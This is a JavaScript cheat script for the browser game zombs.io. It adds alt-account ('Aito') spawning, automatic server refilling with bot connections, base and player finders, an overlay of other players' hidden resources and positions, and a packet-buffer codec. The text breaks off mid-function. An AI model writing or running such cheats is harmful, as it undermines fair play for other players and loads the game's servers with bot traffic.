document.getElementsByClassName("11i2")[0].addEventListener('click', function () {
    window.startaito = !window.startaito;
    document.getElementsByClassName("11i2")[0].innerText = "Start Aito!";
    if (window.startaito) {
        window.sendAitoAlt();
        document.getElementsByClassName("11i2")[0].innerText = "Stop Aito!";
    };
});

document.getElementsByClassName("12i2")[0].addEventListener('click', function () {
    window.basefind = !window.basefind;
    document.getElementsByClassName("12i2")[0].innerText = "Activate Base Finder";
    if (window.basefind) {
        window.baseFinder();
        document.getElementsByClassName("12i2")[0].innerText = "Deactivate Base Finder";
    } else {
        window.playertrick = false;
    };
});

document.getElementsByClassName("17i2")[0].addEventListener('click', function () {
    for (let obj in document.getElementsByClassName('scanned-base').length) {
        document.getElementsByClassName('scanned-base')[obj].remove();
    };
});

document.getElementsByClassName("18i2")[0].addEventListener('click', function () {
    window.startPlayerFinder = !window.startPlayerFinder;
    document.getElementsByClassName("18i2")[0].innerText = "Activate Player Finder";
    if (window.startPlayerFinder) {
        window.playerFinder();
        document.getElementsByClassName("18i2")[0].innerText = "Deactivate Player Finder";
    };
});

document.getElementsByClassName("25i2")[0].addEventListener('click', function () {
    if (window.playerX && window.playerY) {
        window.findPlayer = !window.findPlayer;
        document.getElementsByClassName("25i2")[0].innerText = "Follow Position";
        if (window.findPlayer) {
            document.getElementsByClassName("25i2")[0].innerText = "Unfollow Position";
        };
    } else {
        game.ui.components.PopupOverlay.showHint("Player not found! You can try again once it's found.");
    };
});

// Renderer
let stopped = false;
document.getElementsByClassName('30i6')[0].addEventListener('click', () => {
    let on = game.renderer.ground.isVisible;

    if (on) {
        game.renderer.ground.setVisible(!on);

        document.getElementsByClassName('30i6')[0].innerText = 'Show Ground';
    } else if (!on) {
        game.renderer.ground.setVisible(!on);

        document.getElementsByClassName('30i6')[0].innerText = 'Hide Ground';
    };
});

document.getElementsByClassName('31i6')[0].addEventListener('click', () => {
    let on = game.renderer.projectiles.isVisible;

    if (on) {
        game.renderer.projectiles.setVisible(!on);

        document.getElementsByClassName('31i6')[0].innerText = 'Show Projectiles';
    } else if (!on) {
        game.renderer.projectiles.setVisible(!on);

        document.getElementsByClassName('31i6')[0].innerText = 'Hide Projectiles';
    };
});

document.getElementsByClassName('32i6')[0].addEventListener('click', () => {
    let on = game.renderer.npcs.isVisible;

    if (on) {
        game.renderer.npcs.setVisible(!on);

        document.getElementsByClassName('32i6')[0].innerText = 'Show Npcs';
    } else if (!on) {
        game.renderer.npcs.setVisible(!on);

        document.getElementsByClassName('32i6')[0].innerText = 'Hide Npcs';
    };
});

document.getElementsByClassName('33i6')[0].addEventListener('click', () => {
    let on = game.renderer.scenery.isVisible;

    if (on) {
        game.renderer.scenery.setVisible(!on);

        document.getElementsByClassName('33i6')[0].innerText = 'Show Environment';
    } else if (!on) {
        game.renderer.scenery.setVisible(!on);

        document.getElementsByClassName('33i6')[0].innerText = 'Hide Environment';
    };
});

document.getElementsByClassName('34i6')[0].addEventListener('click', () => {
    let on = game.renderer.scene.isVisible;

    if (on) {
        game.renderer.scene.setVisible(!on);

        document.getElementsByClassName('34i6')[0].innerText = 'Show Scene';
    } else if (!on) {
        game.renderer.scene.setVisible(!on);

        document.getElementsByClassName('34i6')[0].innerText = 'Hide Scene';
    };
});

document.getElementsByClassName('35i6')[0].addEventListener('click', () => {
    if (stopped) {
        game.start();

        document.getElementsByClassName('35i6')[0].innerText = 'Stop Game';
    } else if (!stopped) {
        game.stop();

        document.getElementsByClassName('35i6')[0].innerText = 'Start Game';
    };

    stopped = !stopped;
});


game.network.addEntityUpdateHandler(() => {
    if (getRss) {
        !allowed1 && (allowed1 = true);
    };
    if (getRss || allowed1) {
        for (let i in game.renderer.npcs.attachments) {
            if (game.renderer.npcs.attachments[i].fromTick.name) {
                game.world.getEntityByUid(game.world.myUid).isVerified = true;
                let player = game.renderer.npcs.attachments[i];
                let uid_1 = player.targetTick.uid;
                let isVerified = player.isVerified;
                let wood_1 = player.targetTick.wood.toLocaleString();
                let stone_1 = player.targetTick.stone.toLocaleString();
                let gold_1 = player.targetTick.gold.toLocaleString();
                let token_1 = player.targetTick.token.toLocaleString();
                let px_1 = player.targetTick.position.x;
                let py_1 = player.targetTick.position.y;
                let timeout_1 = "";
                if (getRss && !player.targetTick.oldName) {
                    player.targetTick.oldName = player.targetTick.name;
                    player.targetTick.oldVerified = isVerified
                    player.targetTick.oldWood = wood_1;
                    player.targetTick.oldStone = stone_1;
                    player.targetTick.oldGold = gold_1;
                    player.targetTick.oldToken = token_1;
                    player.targetTick.oldPX = px_1;
                    player.targetTick.oldPY = py_1;
                    player.targetTick.info = `
  [${player.targetTick.oldVerified ? 'âœ“' : 'âœ–'}] ${player.targetTick.oldName}; score: ${player.targetTick.score.toLocaleString()}
  UID: ${player.targetTick.uid}
  W: ${wood_1}, S: ${stone_1}, G: ${gold_1}, T: ${token_1}
  x: ${Math.round(player.targetTick.position.x)}, y: ${Math.round(player.targetTick.position.y)}
  partyId: ${Math.round(player.targetTick.partyId)} [${game.ui.parties[Math.round(player.targetTick.partyId)].memberCount}/4]
  timeDead: ${msToTime(player.targetTick.timeDead)}
                    ${player.targetTick.isPaused ? "On Timeout" : ""}





`;
                    player.targetTick.name = game.renderer.npcs.attachments[i].targetTick.info;
                };
                if (!getRss && player.targetTick.oldName) {
                    player.targetTick.info = player.targetTick.oldName;
                    player.targetTick.name = game.renderer.npcs.attachments[i].targetTick.info;
                    player.targetTick.oldName = null;
                };
                if (getRss) {
                    if (player.targetTick.oldVerified !== isVerified || player.targetTick.oldGold !== gold_1 || player.targetTick.oldWood !== wood_1 || player.targetTick.oldStone !== stone_1 || player.targetTick.oldToken !== token_1 || player.targetTick.oldPX !== px_1 || player.targetTick.oldPY !== py_1) {
                        player.targetTick.oldWood = wood_1;
                        player.targetTick.oldStone = stone_1;
                        player.targetTick.oldGold = gold_1;
                        player.targetTick.oldToken = token_1;
                        player.targetTick.oldPX = px_1;
                        player.targetTick.oldPY = py_1;
                        player.targetTick.info = `
  [${player.targetTick.oldVerified ? 'âœ“' : 'âœ–'}] ${player.targetTick.oldName}; score: ${player.targetTick.score.toLocaleString()}
  UID: ${player.targetTick.uid}
  W: ${wood_1}, S: ${stone_1}, G: ${gold_1}, T: ${token_1}
  x: ${Math.round(player.targetTick.position.x)}, y: ${Math.round(player.targetTick.position.y)}
  partyId: ${Math.round(player.targetTick.partyId)} [${game.ui.parties[Math.round(player.targetTick.partyId)].memberCount}/4]
  timeDead: ${msToTime(player.targetTick.timeDead)}
                    ${player.targetTick.isPaused ? "On Timeout" : ""}





`;
                        player.targetTick.name = game.renderer.npcs.attachments[i].targetTick.info;
                    };
                };
            };
        };
    };
    if (!getRss) {
        allowed1 = false;
    };
});

document.addEventListener("keydown", e => {
    if (document.activeElement.tagName.toLowerCase() !== "input" && document.activeElement.tagName.toLowerCase() !== "textarea") {
        if (e.keyCode == 189) {
            getRss = !getRss;
        };
    };
});

(function () {
    document.getElementsByClassName("hud-party-actions")[0].insertAdjacentHTML("afterend", `
      <button class="btn btn-white" style="width: 120px; margin: 10px 0 0 0;box-shadow: none;" onclick="Game.currentGame.network.sendRpc({ name: 'LeaveParty' });"> Leave </button>
      <input id="psk" style="margin: 10px 10px -5px 15px; width: 281px;" placeholder="Party Share Key" value="" class="btn btn-white" />
      <button class="btn btn-white" style="width: 125px; margin: 10px 0 -1px 0;" onclick="game.network.sendRpc({ name: 'JoinPartyByShareKey', partyShareKey: document.getElementById('psk').value })"> Join </button>
    `);
})();

let map = document.getElementById("hud-map");
let markerId = 1;
window.AM = () => {
    map.insertAdjacentHTML("beforeend", `<div style="background-color: red; display: block; left: ${parseInt(game.ui.components.Map.playerElems[game.world.getMyUid()].marker.style.left)}%; top: ${parseInt(game.ui.components.Map.playerElems[game.world.getMyUid()].marker.style.top)}%; position: absolute;" class='hud-map-player'></div>`)
    markerId++;
    game.ui.components.PopupOverlay.showHint(`Added Marker #${markerId - 1}`);
};
game.network.addRpcHandler("ReceiveChatMessage", e => {
    if (e.uid !== game.world.myUid) { return };
    if (e.message == "!mark") {
        window.AM();
    };
})

Game.currentGame.network.addRpcHandler("SetPartyList", parties => {
    let serverPop = 0;

    for (let party of parties) {
        serverPop += party.memberCount;
    };

    if (window.autorefiller) {
        let neededAlts = 32 - serverPop;

        if (neededAlts > 5) return;

        let delay = ms => new Promise(resolve => {
            setTimeout(resolve, ms);
        });

        delay(1000);

        for (let i = 0; i < neededAlts; i++) {
            delay(2000);

            window.sendws();

            delay(2000);
        };
    };

    document.getElementsByClassName("hud-party-server")[0].innerHTML = `${serverPop}/32 <small>${game.network.connectionOptions.name}</small>`;
});

let getElement = (Element) => {
    return document.getElementsByClassName(Element);
};

let getId = (Element) => {
    return document.getElementById(Element);
}

getElement("hud-party-members")[0].style.display = "block";
getElement("hud-party-grid")[0].style.display = "none";

let privateTab = document.createElement("a");
privateTab.className = "hud-party-tabs-link";
privateTab.id = "privateTab";
privateTab.innerHTML = "Closed Parties";

let privateHud = document.createElement("div");
privateHud.className = "hud-private hud-party-grid";
privateHud.id = "privateHud";
privateHud.style = "display: none;";
getElement("hud-party-tabs")[0].appendChild(privateTab);
getElement("hud-menu hud-menu-party")[0].insertBefore(privateHud, getElement("hud-party-actions")[0]);

// Keys

let keyTab = document.createElement("a");
keyTab.className = "hud-party-tabs-link";
keyTab.id = "keyTab";
keyTab.innerHTML = "Party Keys";
getElement("hud-party-tabs")[0].appendChild(keyTab);
let keyHud = document.createElement("div");
keyHud.className = "hud-keys hud-party-grid";
keyHud.id = "keyHud";
keyHud.style = "display: none;";
getElement("hud-menu hud-menu-party")[0].insertBefore(keyHud, getElement("hud-party-actions")[0]);

getId("privateTab").onclick = e => {
    for (let i = 0; i < getElement("hud-party-tabs-link").length; i++) {
        getElement("hud-party-tabs-link")[i].className = "hud-party-tabs-link";
    }
    getId("privateTab").className = "hud-party-tabs-link is-active";
    getId("privateHud").setAttribute("style", "display: block;");
    if (getElement("hud-party-members")[0].getAttribute("style") == "display: block;") {
        getElement("hud-party-members")[0].setAttribute("style", "display: none;");
    }
    if (getElement("hud-party-grid")[0].getAttribute("style") == "display: block;") {
        getElement("hud-party-grid")[0].setAttribute("style", "display: none;");
    }
    if (getId("privateHud").getAttribute("style") == "display: none;") {
        getId("privateHud").setAttribute("style", "display: block;");
    }
    if (getId("keyHud").getAttribute("style") == "display: block;") {
        getId("keyHud").setAttribute("style", "display: none;");
    }
}
getElement("hud-party-tabs-link")[0].onmouseup = e => {
    getId("privateHud").setAttribute("style", "display: none;");
    getId("keyHud").setAttribute("style", "display: none;");
    if (getId("privateTab").className == "hud-party-tabs-link is-active") {
        getId("privateTab").className = "hud-party-tabs-link"
    }
    if (getId("keyTab").className == "hud-party-tabs-link is-active") {
        getId("keyTab").className = "hud-party-tabs-link"
    }
}
getElement("hud-party-tabs-link")[1].onmouseup = e => {
    getId("privateHud").setAttribute("style", "display: none;");
    getId("keyHud").setAttribute("style", "display: none;");
    getId
    if (getId("privateTab").className == "hud-party-tabs-link is-active") {
        getId("privateTab").className = "hud-party-tabs-link"
    }
    if (getId("keyTab").className == "hud-party-tabs-link is-active") {
        getId("keyTab").className = "hud-party-tabs-link"
    }
}
getId("keyTab").onmouseup = e => {
    for (let i = 0; i < getElement("hud-party-tabs-link").length; i++) {
        getElement("hud-party-tabs-link")[i].className = "hud-party-tabs-link";
    }
    getId("keyTab").className = "hud-party-tabs-link is-active";
    getId("keyHud").setAttribute("style", "display: block;");
    if (getElement("hud-party-members")[0].getAttribute("style") == "display: block;") {
        getElement("hud-party-members")[0].setAttribute("style", "display: none;");
    }
    if (getElement("hud-party-grid")[0].getAttribute("style") == "display: block;") {
        getElement("hud-party-grid")[0].setAttribute("style", "display: none;");
    }
    if (getId("privateHud").getAttribute("style") == "display: block;") {
        getId("privateHud").setAttribute("style", "display: none;");
    }
    if (getId("keyHud").getAttribute("style") == "display: none;") {
        getId("keyHud").setAttribute("style", "display: block;");
    }
};

getElement('hud-keys hud-party-grid')[0].innerHTML += "<h3>Party Keys</h3><br>"

game.network.addRpcHandler("PartyShareKey", function (e) {
    let cpKeyId = `skl${Math.floor(Math.random() * 999999)}`;
    let cpLnkId = `skl${Math.floor(Math.random() * 999999)}`;
    let psk = e.partyShareKey;
    let lnk = `https://zombs.io/#/${game.options.serverId}/${psk}`;
    getId("keyHud").innerHTML += `<div style="display:inline-block;margin-right:10px;"><p>${psk}</p></div><button class="btn btn-white" id="${cpKeyId}" style="display:inline-block;" onclick="window.copyText('${psk}');">Copy Key</button>&nbsp<button class="btn btn-white" id="${cpLnkId}" style="display:inline-block;" onclick="window.copyText('${lnk}');">Copy Link</button><br />`;
});

window.copyText = t => {
    const elem = document.createElement('textarea');
    elem.value = t;
    document.body.appendChild(elem);
    elem.select();
    document.execCommand('copy');
    document.body.removeChild(elem);
};

let parties = "";
Game.currentGame.network.addRpcHandler("SetPartyList", e => {
    parties = "";
    for (let i in e) {
        if (e[i].isOpen == 0) {
            parties += "<div style=\"width: relative; height: relative;\" class=\"hud-party-link\"><strong>" + e[i].partyName + "</strong><span>" + e[i].partyId + "; " + e[i].memberCount + "/4<span></div>";
        }
    }
    getId("privateHud").innerHTML = parties;
});

document.querySelector('#hud').insertAdjacentHTML('beforeend', `
      <div id="hud-menu-iframes" ; class="hud-menu-iframe hud-menu">
         <a class="hud-menu-close"></a>
         <h3>null</h3>
         <div class="hud-iframe-grid">
         </div>
      </div>
   `)
document.querySelector("#hud-menu-iframes > a").addEventListener('click', () => document.getElementById('hud-menu-iframes').style.display = 'none')
let mm = document.getElementsByClassName("hud-menu-iframe")[0];

function iframeMenu() {
    if (["none", ""].includes(mm.style.display)) {
        mm.style.display = "block";
        for (let i of Array.from(document.getElementsByClassName("hud-menu"))) {
            if (i.classList.contains('hud-menu-iframe')) { return; };
            i.style.display = "none";
        };
    } else {
        mm.style.display = "none";
    };
};

document.getElementsByClassName("hud-menu-icons")[0].insertAdjacentHTML("beforeend", `<div class="hud-menu-icon" data-type="Iframe"></div>`);
document.querySelectorAll(".hud-menu-icon")[3].addEventListener("click", iframeMenu)
document.getElementsByClassName("hud-menu-iframe")[0].style.overflow = "auto";

for (let i of Array.from(document.getElementsByClassName("hud-menu-icon"))) {
    if (i.dataset.type !== "Iframe") {
        i.addEventListener('click', function () {
            if (document.getElementsByClassName("hud-menu-iframe")[0].style.display == "block") {
                document.getElementsByClassName("hud-menu-iframe")[0].style.display = "none";
            };
        });
    };
};
for (let i of Array.from(document.getElementsByClassName("hud-spell-icon"))) {
    if (i.dataset.type !== "HealTowersSpell" && i.dataset.type !== "TimeoutItem") {
        i.addEventListener('click', function () {
            if (document.getElementsByClassName("hud-menu-iframe")[0].style.display == "block") {
                document.getElementsByClassName("hud-menu-iframe")[0].style.display = "none";
            };
        });
    };
};

document.addEventListener("keyup", e => {
    if (document.activeElement.tagName.toLowerCase() !== "input" && document.activeElement.tagName.toLowerCase() !== "textarea") {
        if (e.key === "o" || e.key === "p" || e.key === "b" || e.key === "/" || e.keyCode == 27) {
            if (mm.style.display == "block") {
                mm.style.display = "none";
            }
        }
    }
})

let dimension = 1;
const onWindowResize = () => {
    const renderer = game.renderer;
    let canvasWidth = window.innerWidth * window.devicePixelRatio;
    let canvasHeight = window.innerHeight * window.devicePixelRatio;
    let ratio = Math.max(canvasWidth / (1920 * dimension), canvasHeight / (1080 * dimension));
    renderer.scale = ratio;
    renderer.entities.setScale(ratio);
    renderer.ui.setScale(ratio);
    renderer.renderer.resize(canvasWidth, canvasHeight);
    renderer.viewport.width = renderer.renderer.width / renderer.scale + 4 * renderer.viewportPadding;
    renderer.viewport.height = renderer.renderer.height / renderer.scale + 4 * renderer.viewportPadding;
};

onWindowResize();

window.onresize = onWindowResize;

window.onwheel = e => {
    if (e.deltaY > 0) {
        dimension += 0.08;
    } else if (e.deltaY < 0) {
        dimension -= 0.08;
    };
    onWindowResize();
};

window.zoom = val => {
    dimension = val;
    onWindowResize();
};

game.world.removeEntity2 = game.world.removeEntity;
game.world.removeEntity = (uid) => {
    if (game.world.entities[uid].fromTick.model == "Tree" || game.world.entities[uid].fromTick.model == "Stone" || game.world.entities[uid].fromTick.model == "NeutralCamp") return;
    game.world.removeEntity2(uid);
};

game.network.addEnterWorldHandler(() => {
    game.network.sendInput({ up: 1, left: 0 });
    game.renderer.ground.attachments[0].attachments[0].setAlpha(0);
    game.renderer.ground.attachments[0].attachments[1].setAlpha(0.625);
});

function counter(e = 0) {
    if (e <= -0.99949999999999999e24) {
        return Math.round(e / -1e23) / -10 + "TT";
    };
    if (e <= -0.99949999999999999e21) {
        return Math.round(e / -1e20) / -10 + "TB";
    };
    if (e <= -0.99949999999999999e18) {
        return Math.round(e / -1e17) / -10 + "TM";
    };
    if (e <= -0.99949999999999999e15) {
        return Math.round(e / -1e14) / -10 + "TK";
    };
    if (e <= -0.99949999999999999e12) {
        return Math.round(e / -1e11) / -10 + "T";
    };
    if (e <= -0.99949999999999999e9) {
        return Math.round(e / -1e8) / -10 + "B";
    };
    if (e <= -0.99949999999999999e6) {
        return Math.round(e / -1e5) / -10 + "M";
    };
    if (e <= -0.99949999999999999e3) {
        return Math.round(e / -1e2) / -10 + "K";
    };
    if (e <= 0.99949999999999999e3) {
        return Math.round(e) + "";
    };
    if (e <= 0.99949999999999999e6) {
        return Math.round(e / 1e2) / 10 + "K";
    };
    if (e <= 0.99949999999999999e9) {
        return Math.round(e / 1e5) / 10 + "M";
    };
    if (e <= 0.99949999999999999e12) {
        return Math.round(e / 1e8) / 10 + "B";
    };
    if (e <= 0.99949999999999999e15) {
        return Math.round(e / 1e11) / 10 + "T";
    };
    if (e <= 0.99949999999999999e18) {
        return Math.round(e / 1e14) / 10 + "TK";
    };
    if (e <= 0.99949999999999999e21) {
        return Math.round(e / 1e17) / 10 + "TM";
    };
    if (e <= 0.99949999999999999e24) {
        return Math.round(e / 1e20) / 10 + "TB";
    };
    if (e <= 0.99949999999999999e27) {
        return Math.round(e / 1e+23) / 10 + "TT";
    };
    if (e >= 0.99949999999999999e27) {
        return Math.round(e / 1e+23) / 10 + "TT";
    };
};
game.script = {};

class Lxiv {
    constructor() {
        this.aout = [
            65, 66, 67, 68, 69, 70, 71, 72, 73, 74, 75, 76, 77, 78, 79, 80, 117,
            81, 82, 83, 84, 85, 86, 87, 88, 89, 90, 97, 98, 99, 100, 101, 102,
            103, 104, 105, 106, 107, 108, 109, 110, 111, 112, 113, 114, 115, 116,
            119, 120, 121, 122, 48, 49, 50, 51, 52, 53, 54, 55, 56, 57, 43, 47, 118
        ];

        this.ain = [];

        for (let i = 0; i < this.aout.length; ++i) {
            this.ain[this.aout[i]] = i;
        };
    };

    encode(src, dst) {
        var b, t;

        while ((b = src()) !== null) {
            dst(this.aout[(b >> 2) & 0x3f]);

            t = (b & 0x3) << 4;

            if ((b = src()) !== null) {
                t |= (b >> 4) & 0xf;

                dst(this.aout[(t | ((b >> 4) & 0xf)) & 0x3f]);

                t = (b & 0xf) << 2;

                if ((b = src()) !== null) dst(this.aout[(t | ((b >> 6) & 0x3)) & 0x3f]), dst(this.aout[b & 0x3f]);
                else dst(this.aout[t & 0x3f]), dst(61);
            } else dst(this.aout[t & 0x3f]), dst(61), dst(61);
        };
    };

    decode(src, dst) {
        var c, t1, t2;

        function fail(c) {
            throw Error("Illegal character code: " + c);
        };

        while ((c = src()) !== null) {
            t1 = this.ain[c];

            if (typeof t1 === 'undefined') fail(c);

            if ((c = src()) !== null) {
                t2 = this.ain[c];

                if (typeof t2 === 'undefined') fail(c);

                dst((t1 << 2) >>> 0 | (t2 & 0x30) >> 4);

                if ((c = src()) !== null) {
                    t1 = this.ain[c];

                    if (typeof t1 === 'undefined')
                        if (c === 61) break;
                        else fail(c);

                    dst(((t2 & 0xf) << 4) >>> 0 | (t1 & 0x3c) >> 2);

                    if ((c = src()) !== null) {
                        t2 = this.ain[c];

                        if (typeof t2 === 'undefined')
                            if (c === 61) break;
                            else fail(c);

                        dst(((t1 & 0x3) << 6) >>> 0 | t2);
                    };
                };
            };
        };
    };
};

let lxiv = new Lxiv();

class Utfx {
    constructor() {
        this.MAX_CODEPOINT = 0x10FFFF;
    };

    encodeUTF8(src, dst) {
        var cp = null;

        if (typeof src === 'number')
            cp = src,
                src = function () {

                    return null;
                };

        while (cp !== null || (cp = src()) !== null) {
            if (cp < 0x80)
                dst(cp & 0x7F);

            else if (cp < 0x800)
                dst(((cp >> 6) & 0x1F) | 0xC0),

                    dst((cp & 0x3F) | 0x80);

            else if (cp < 0x10000)
                dst(((cp >> 12) & 0x0F) | 0xE0),

                    dst(((cp >> 6) & 0x3F) | 0x80),

                    dst((cp & 0x3F) | 0x80);

            else
                dst(((cp >> 18) & 0x07) | 0xF0),

                    dst(((cp >> 12) & 0x3F) | 0x80),

                    dst(((cp >> 6) & 0x3F) | 0x80),

                    dst((cp & 0x3F) | 0x80);

            cp = null;
        };
    };

    decodeUTF8(src, dst) {
        var a, b, c, d, fail = function (b) {
            b = b.slice(0, b.indexOf(null));

            var err = Error(b.toString());

            err.name = "TruncatedError";

            err['bytes'] = b;

            throw err;
        };

        while ((a = src()) !== null) {
            if ((a & 0x80) === 0)
                dst(a);

            else if ((a & 0xE0) === 0xC0)
                ((b = src()) === null) && fail([a, b]),

                    dst(((a & 0x1F) << 6) | (b & 0x3F));

            else if ((a & 0xF0) === 0xE0)
                ((b = src()) === null ||
                    (c = src()) === null) &&
                    fail([a, b, c]),

                    dst(((a & 0x0F) << 12) | ((b & 0x3F) << 6) | (c & 0x3F));
            else if ((a & 0xF8) === 0xF0)
                ((b = src()) === null ||
                    (c = src()) === null || (d = src()) === null) &&
                    fail([a, b, c, d]),

                    dst(((a & 0x07) << 18) | ((b & 0x3F) << 12) | ((c & 0x3F) << 6) | (d & 0x3F));

            else throw RangeError("Illegal starting byte: " + a);
        };
    };

    UTF16toUTF8(src, dst) {
        var c1, c2 = null;

        while (true) {
            if ((c1 = c2 !== null ? c2 : src()) === null) break;

            if (c1 >= 0xD800 && c1 <= 0xDFFF) {
                if ((c2 = src()) !== null) {
                    if (c2 >= 0xDC00 && c2 <= 0xDFFF) {
                        dst((c1 - 0xD800) * 0x400 + c2 - 0xDC00 + 0x10000);

                        c2 = null;

                        continue;
                    };
                };
            };

            dst(c1);
        };

        if (c2 !== null) dst(c2);
    };

    UTF8toUTF16 = function (src, dst) {
        var cp = null;

        if (typeof src === 'number')
            cp = src, src = function () {
                return null;
            };

        while (cp !== null || (cp = src()) !== null) {
            if (cp <= 0xFFFF)
                dst(cp);
            else
                cp -= 0x10000,

                    dst((cp >> 10) + 0xD800),

                    dst((cp % 0x400) + 0xDC00);

            cp = null;
        };
    };

    encodeUTF16toUTF8(src, dst) {
        utfx.UTF16toUTF8(src, (cp) => {
            utfx.encodeUTF8(cp, dst);
        });
    };

    decodeUTF8toUTF16(src, dst) {
        utfx.decodeUTF8(src, (cp) => {
            utfx.UTF8toUTF16(cp, dst);
        });
    };

    calculateCodePoint(cp) {
        return (cp < 0x80) ? 1 : (cp < 0x800) ? 2 : (cp < 0x10000) ? 3 : 4;
    };

    calculateUTF8(src) {
        var cp, l = 0;

        while ((cp = src()) !== null)
            l += (cp < 0x80) ? 1 : (cp < 0x800) ? 2 : (cp < 0x10000) ? 3 : 4;

        return l;
    };

    calculateUTF16asUTF8(src) {
        var n = 0,
            l = 0;

        utfx.UTF16toUTF8(src, (cp) => {
            ++n;

            l += (cp < 0x80) ? 1 : (cp < 0x800) ? 2 : (cp < 0x10000) ? 3 : 4;
        });

        return [n, l];
    };
}

let utfx = new Utfx();

class ByteBuffer {
    constructor(capacity, littleEndian, noAssert) {
        if (typeof capacity === 'undefined')
            capacity = ByteBuffer.DEFAULT_CAPACITY;

        if (typeof littleEndian === 'undefined')
            littleEndian = ByteBuffer.DEFAULT_ENDIAN;

        if (typeof noAssert === 'undefined')
            noAssert = ByteBuffer.DEFAULT_NOASSERT;

        if (!noAssert) {
            capacity = capacity | 0;

            if (capacity < 0)
                throw RangeError("Illegal capacity");

            littleEndian = !!littleEndian;

            noAssert = !!noAssert;
        };

        var EMPTY_BUFFER = new ArrayBuffer(0);

        this.buffer = capacity === 0 ? EMPTY_BUFFER : new ArrayBuffer(capacity);

        this.view = capacity === 0 ? null : new Uint8Array(this.buffer);

        this.offset = 0;

        this.markedOffset = -1;

        this.limit = capacity;

        this.littleEndian = littleEndian;

        this.noAssert = noAssert;
    };

    stringSource(s) {
        var i = 0;

        return function () {
            return i < s.length ? s.charCodeAt(i++) : null;
        };
    };

    stringDestination() {
        var cs = [],
            ps = [];

        return function () {
            if (arguments.length === 0)
                return ps.join('') + String.fromCharCode.apply(String, cs);

            if (cs.length + arguments.length > 1024)
                ps.push(String.fromCharCode.apply(String, cs)),
                    cs.length = 0;

            Array.prototype.push.apply(cs, arguments);
        };
    };

    readInt8(offset) {
        var relative = typeof offset === 'undefined';

        if (relative) offset = this.offset;

        if (!this.noAssert) {
            if (typeof offset !== 'number' || offset % 1 !== 0)
                throw TypeError("Illegal offset: " + offset + " (not an integer)");

            offset >>>= 0;

            if (offset < 0 || offset + 1 > this.buffer.byteLength)
                throw RangeError("Illegal offset: 0 <= " + offset + " (+" + 1 + ") <= " + this.buffer.byteLength);
        };

        var value = this.view[offset];

        if ((value & 0x80) === 0x80) value = -(0xFF - value + 1); // Cast to signed

        if (relative) this.offset += 1;

        return value;
    };

    writeUint8(value, offset) {
        var relative = typeof offset === 'undefined';

        if (relative) offset = this.offset;

        if (!this.noAssert) {
            if (typeof value !== 'number' || value % 1 !== 0)
                throw TypeError("Illegal value: " + value + " (not an integer)");

            value >>>= 0;

            if (typeof offset !== 'number' || offset % 1 !== 0)
                throw TypeError("Illegal offset: " + offset + " (not an integer)");

            offset >>>= 0;

            if (offset < 0 || offset + 0 > this.buffer.byteLength)
                throw RangeError("Illegal offset: 0 <= " + offset + " (+" + 0 + ") <= " + this.buffer.byteLength);
        };

        offset += 1;

        var capacity1 = this.buffer.byteLength;

        if (offset > capacity1)
            this.resize((capacity1 *= 2) > offset ? capacity1 : offset);

        offset -= 1;

        this.view[offset] = value;

        if (relative) this.offset += 1;

        return this;
    };

    readUint8(offset) {
        var relative = typeof offset === 'undefined';

        if (relative) offset = this.offset;

        if (!this.noAssert) {
            if (typeof offset !== 'number' || offset % 1 !== 0)
                throw TypeError("Illegal offset: " + offset + " (not an integer)");

            offset >>>= 0;

            if (offset < 0 || offset + 1 > this.buffer.byteLength)
                throw RangeError("Illegal offset: 0 <= " + offset + " (+" + 1 + ") <= " + this.buffer.byteLength);
        };

        var value = this.view[offset];

        if (relative) this.offset += 1;

        return value;
    };

    writeInt16(value, offset) {
        var relative = typeof offset === 'undefined';

        if (relative) offset = this.offset;

        if (!this.noAssert) {
            if (typeof value !== 'number' || value % 1 !== 0)
                throw TypeError("Illegal value: " + value + " (not an integer)");

            value |= 0;

            if (typeof offset !== 'number' || offset % 1 !== 0)
                throw TypeError("Illegal offset: " + offset + " (not an integer)");

            offset >>>= 0;

            if (offset < 0 || offset + 0 > this.buffer.byteLength)
                throw RangeError("Illegal offset: 0 <= " + offset + " (+" + 0 + ") <= " + this.buffer.byteLength);
        };

        offset += 2;

        var capacity2 = this.buffer.byteLength;

        if (offset > capacity2)
            this.resize((capacity2 *= 2) > offset ? capacity2 : offset);

        offset -= 2;

        if (this.littleEndian) {
            this.view[offset + 1] = (value & 0xFF00) >>> 8;

            this.view[offset] = value & 0x00FF;
        } else {
            this.view[offset] = (value & 0xFF00) >>> 8;

            this.view[offset + 1] = value & 0x00FF;
        };

        if (relative) this.offset += 2;

        return this;
    };

    readInt16(offset) {
        var relative = typeof offset === 'undefined';

        if (relative) offset = this.offset;

        if (!this.noAssert) {
            if (typeof offset !== 'number' || offset % 1 !== 0)
                throw TypeError("Illegal offset: " + offset + " (not an integer)");

            offset >>>= 0;

            if (offset < 0 || offset + 2 > this.buffer.byteLength)
                throw RangeError("Illegal offset: 0 <= " + offset + " (+" + 2 + ") <= " + this.buffer.byteLength);
        };

        var value = 0;

        if (this.littleEndian) {
            value = this.view[offset];

            value |= this.view[offset + 1] << 8;
        } else {
            value = this.view[offset] << 8;

            value |= this.view[offset + 1];
        };

        if ((value & 0x8000) === 0x8000)
            value = -(0xFFFF - value + 1);

        if (relative) this.offset += 2;

        return value;
    };

    writeUint16(value, offset) {
        var relative = typeof offset === 'undefined';

        if (relative) offset = this.offset;

        if (!this.noAssert) {
            if (typeof value !== 'number' || value % 1 !== 0)
                throw TypeError("Illegal value: " + value + " (not an integer)");

            value >>>= 0;

            if (typeof offset !== 'number' || offset % 1 !== 0)
                throw TypeError("Illegal offset: " + offset + " (not an integer)");

            offset >>>= 0;

            if (offset < 0 || offset + 0 > this.buffer.byteLength)
                throw RangeError("Illegal offset: 0 <= " + offset + " (+" + 0 + ") <= " + this.buffer.byteLength);
        };

        offset += 2;

        var capacity3 = this.buffer.byteLength;

        if (offset > capacity3)
            this.resize((capacity3 *= 2) > offset ? capacity3 : offset);

        offset -= 2;

        if (this.littleEndian) {
            this.view[offset + 1] = (value & 0xFF00) >>> 8;

            this.view[offset] = value & 0x00FF;
        } else {
            this.view[offset] = (value & 0xFF00) >>> 8;

            this.view[offset + 1] = value & 0x00FF;
        };

        if (relative) this.offset += 2;

        return this;
    };

    readUint16(offset) {
        var relative = typeof offset === 'undefined';

        if (relative) offset = this.offset;

        if (!this.noAssert) {
            if (typeof offset !== 'number' || offset % 1 !== 0)
                throw TypeError("Illegal offset: " + offset + " (not an integer)");

            offset >>>= 0;

            if (offset < 0 || offset + 2 > this.buffer.byteLength)
